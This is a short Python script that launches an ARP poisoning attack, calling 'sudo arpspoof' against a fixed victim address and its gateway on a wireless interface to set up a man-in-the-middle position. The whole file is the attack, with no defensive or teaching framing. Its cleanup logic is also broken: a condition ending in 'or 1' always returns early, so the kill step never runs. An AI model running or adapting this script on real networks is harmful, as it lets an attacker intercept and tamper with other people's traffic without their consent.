import os
import subprocess
import time
from subprocess import check_call

def arp():
    print("\nAttempting ARP Poisoning...")
    os.system("ip route")
    order = "sudo arpspoof -i wlan0 -t 192.168.0.106 -r 192.168.0.1"
    geny  = os.system(order)
    time.sleep(2)
    if os.system("PID=$!") or 1:
        return 1
    os.system("kill PID")

    return 0